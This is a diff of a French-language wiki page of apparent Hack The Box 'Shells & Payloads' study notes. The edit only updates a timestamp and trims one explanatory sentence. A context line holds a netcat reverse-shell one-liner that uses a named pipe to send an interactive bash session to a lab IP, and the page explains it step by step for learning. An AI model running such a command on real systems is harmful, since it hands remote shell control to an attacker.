@@ -2,7 +2,7 @@
 title: Shells & Payloads
 description: 
 published: true
-date: 2025-05-17T19:47:03.498Z
+date: 2025-05-17T19:47:23.319Z
 tags: htb, module
 editor: markdown
 dateCreated: 2025-05-04T16:19:33.360Z
@@ -182,7 +182,7 @@ rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.10.14.12 777
    Supprime le fichier `/tmp/f` s’il existe déjà.
 
 2. **`mkfifo /tmp/f;`**
-   Crée un fichier [pipe nommé (FIFO)](https://man7.org/linux/man-pages/man7/fifo.7.html) pour permettre la communication entre processus.
+   Crée un fichier [pipe nommé (FIFO)](https://man7.org/linux/man-pages/man7/fifo.7.html).
 
 3. **`cat /tmp/f |`**
    Concatène le fichier nommé **/tmp/f** (un FIFO), et transmet sa sortie via un pipe à la commande suivante.
